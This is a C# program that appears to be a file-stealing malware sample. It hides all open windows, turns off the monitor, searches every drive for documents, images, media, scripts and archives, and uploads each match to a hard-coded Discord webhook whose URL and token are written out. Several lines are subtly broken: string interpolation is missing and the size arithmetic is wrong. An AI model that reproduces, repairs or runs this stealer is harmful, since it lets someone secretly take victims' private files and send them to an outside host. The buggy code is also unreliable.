using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Collections.Generic;
using System.Linq;

class Program
{
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);

    [DllImport("user32.dll")]
    public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    [DllImport("user32.dll")]
    static extern int GetWindowLong(IntPtr hWnd, int nIndex);

    const int SW_HIDE = 0;
    const int GWL_EXSTYLE = -20;
    const int WS_EX_TOOLWINDOW = 0x00000080;

    static string WEBHOOK_URL = "https://discord.com/api/webhooks/1204138849257783397/oKVs9yUElHnMhnuGYGnSodG9NGXAZ9lSj_5cm9jsdx61cP44JXbWommB1heD6QHMGx4I";
    static List<string> BLACKLISTED_DIRS = new List<string> { "C:\\Windows\\", "C:\\Program Files\\", "C:\\Program Files (x86)\\", "C:\\Recycle.Bin\\", "C:\\AMD\\" };
    static int MAX_FILE_SIZE_MB = 8;

    static void Main(string[] args)
    {
        BlockInput(false);
        SendMessage((IntPtr)0xFFFF, 0x112, (IntPtr)0xF170, (IntPtr)2);

        List<IntPtr> windows = new List<IntPtr>();
        EnumWindowsCallback callBack = new EnumWindowsCallback();
        EnumWindows(callBack.Callback, IntPtr.Zero);

        foreach (IntPtr hwnd in callBack.GetWindows())
        {
            if (IsWindowVisible(hwnd))
            {
                ShowWindow(hwnd, SW_HIDE);
                int exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
                SetWindowLong(hwnd, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
            }
        }

        List<string> drives = Enumerable.Range('A', 'Z' - 'A' + 1).Select(i => "{(char)i}:\\").Where(Directory.Exists).ToList();
        List<List<string>> driveGroups = new List<List<string>>();

        for (int i = 0; i < drives.Count; i += 4)
        {
            driveGroups.Add(drives.GetRange(i, Math.Min(4, drives.Count - i)));
        }

        foreach (List<string> group in driveGroups)
        {
            List<Thread> threads = new List<Thread>();
            foreach (string drive in group)
            {
                Thread thread = new Thread(() => SearchFiles(drive));
                threads.Add(thread);
                thread.Start();
            }
            foreach (Thread thread in threads)
            {
                thread.Join();
            }
        }

        BlockInput(false);
        SendMessage((IntPtr)0xFFFF, 0x112, (IntPtr)0xF170, (IntPtr)(-1));
    }

    static void SearchFiles(string rootDir)
    {
        foreach (string root in Directory.GetDirectories(rootDir))
        {
            if (BLACKLISTED_DIRS.Any(dir => root.Contains(dir)))
            {
                continue;
            }
            foreach (string file in Directory.GetFiles(root))
            {
                string filePath = Path.Combine(root, file);
                if (CheckFile(filePath))
                {
                    UploadFile(filePath);
                }
            }
        }
    }

    static bool CheckFile(string filePath)
    {
        List<string> allowedExtensions = new List<string> { ".txt", ".pdf", ".png", ".jpg", ".jpeg", ".gif", ".mp4", ".mp3", ".py", ".js", ".mkv", ".docx", ".xls", ".cs", ".cpp", ".rar", ".zip", ".7z", ".mov", ".bat", ".vbs" };
        if (!allowedExtensions.Contains(Path.GetExtension(filePath).ToLower()))
        {
            Console.WriteLine("Skipping file {filePath} - invalid file type");
            return false;
        }
        else if (new FileInfo(filePath).Length > MAX_FILE_SIZE_MB * 2048 * 2048)
        {
            Console.WriteLine("Skipping file {filePath} - file size too large");
            return false;
        }
        else if (!File.Exists(filePath) || (File.GetAttributes(filePath) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
        {
            Console.WriteLine("Skipping file {filePath} - file requires admin privileges");
            return false;
        }
        else if (BLACKLISTED_DIRS.Any(dir => filePath.Contains(dir)))
        {
            Console.WriteLine("Skipping file {filePath} - in blacklisted directory");
            return false;
        }
        else
        {
            return true;
        }
    }

    static void UploadFile(string filePath)
    {
        try
        {
            WebClient client = new WebClient();
            client.Headers.Add("User-Agent", "Mozilla/5.0");
            byte[] response = client.UploadFile(WEBHOOK_URL, "POST", filePath);
            Console.WriteLine("Successfully uploaded file {filePath}");
        }
        catch (Exception e)
        {
            Console.WriteLine("Failed to upload file {filePath} - {e.Message}");
        }
    }

    delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool IsWindowVisible(IntPtr hWnd);

    class EnumWindowsCallback
    {
        List<IntPtr> windows = new List<IntPtr>();

        public bool Callback(IntPtr hWnd, IntPtr lParam)
        {
            windows.Add(hWnd);
            return true;
        }

        public List<IntPtr> GetWindows()
        {
            return windows;
        }
    }
}
